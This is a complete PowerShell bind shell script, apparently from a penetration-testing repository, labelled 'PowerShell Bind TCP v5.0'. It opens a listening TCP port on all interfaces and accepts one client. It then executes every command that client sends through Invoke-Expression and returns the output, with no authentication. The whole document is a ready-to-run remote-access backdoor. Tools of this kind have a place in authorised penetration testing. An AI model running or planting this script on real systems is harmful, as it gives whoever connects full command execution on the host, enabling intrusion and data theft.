$p = $(Read-Host -Prompt "Enter port number").Trim(); if (-not $p) { Write-Host "Port number is required"; exit 1; } Write-Host "PowerShell Bind TCP v5.0 by Ivan Sincek."; Write-Host "GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp."; $b = New-Object Byte[] 1024; $d = New-Object Text.StringBuilder; $r = New-Object Text.StringBuilder; Write-Host "Waiting for client to connect..."; try { $l = New-Object Net.Sockets.TcpListener("0.0.0.0", $p); $l.Start(); $c = $l.AcceptTcpClient(); $l.Stop(); $s = $c.GetStream(); $e = New-Object Text.UTF8Encoding; $w = New-Object IO.StreamWriter($s, $e, $b.Length); $w.AutoFlush = $true; Write-Host "Client has connected!"; do { $w.Write("PS>"); [void]$d.Clear(); do { $by = $s.Read($b, 0, $b.Length); if ($by -gt 0) { [void]$d.Append($e.GetString($b, 0, $by)); } } while ($s.DataAvailable); if ($d.Length -gt 0) { [void]$r.Clear(); try { [void]$r.Append($(Invoke-Expression -Command $d.ToString() 2>&1 | Out-String)); } catch { [void]$r.Append($_.Exception.Message); } $w.Write($r.ToString()); } } while ($by -gt 0); Write-Host "Client has disconnected!"; } catch { Write-Host "ERROR: $($_.Exception.Message)"; } finally { if ($w) { $w.Close(); $w.Dispose(); Clear-Variable "w"; } if ($s) { $s.Close(); $s.Dispose(); Clear-Variable "s"; } if ($c) { $c.Close(); $c.Dispose(); Clear-Variable "c"; } if ($l) { $l.Server.Close(); $l.Server.Dispose(); Clear-Variable "l"; } [void]$b.Clear(); Clear-Variable "b"; [void]$d.Clear(); Clear-Variable "d"; [void]$r.Clear(); Clear-Variable "r"; [GC]::Collect(); } Clear-Variable "p";
